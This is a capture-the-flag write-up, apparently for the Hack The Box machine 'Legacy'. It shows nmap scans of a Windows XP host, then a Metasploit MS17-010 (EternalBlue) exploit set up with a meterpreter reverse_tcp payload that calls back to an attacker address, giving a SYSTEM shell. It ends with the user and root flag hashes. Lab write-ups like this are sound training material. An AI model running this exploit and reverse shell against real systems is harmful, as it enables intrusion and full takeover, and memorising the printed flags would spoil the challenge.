#box #MS17-010 #metasploit 
# Nmap

After running nmap we discover port 445 open

```bash title:NMAPScan
# Nmap 7.95 scan initiated Sun Mar 16 14:52:54 2025 as: /usr/lib/nmap/nmap -sC -sV -p135,139,445 -oA nmap_sCsV 10.129.227.181
Nmap scan report for 10.129.227.181
Host is up (0.079s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2025-03-21T18:50:54+02:00
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:2a:b6 (VMware)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m51s, median: 4d23h57m39s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 16 14:53:25 2025 -- 1 IP address (1 host up) scanned in 30.35 seconds
```
by launching a nmap script within nmap scripting engine the scanner discovers the presence of a vulnerability, two actually:
* CVE-2008-4250
* CVE-2017-0143

The command ran was:
```bash title:NMAPScanWithVulnerabilityScanning
nmap --script=smb-vuln* 10.129.227.181 -p445
```

# SMB

Knowing the vulnerability, from the Nmap scan, we launch metasploit and try to get a meterpreter shell within one of the two CVE.
We opt for `MS17_010` - `CVE-2017-0143`

```metasploit title:MS17-010_Options
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                10.129.227.181                                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.11      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

After configuring the metasploit settings by adding the RHOSTS and the LHOST we can `exploit` to successfully gain a shell.

## Privilege Escalation

Due to the nature of this vulnerability, we're already `NT AUTHORITY\SYSTEM` on the remote machine, leading us to a complete system takeover.

User: `e69af0e4f443de7e36876fda4ec7644f`
Root: `993442d258b0e0ec917cae9e695d5713`
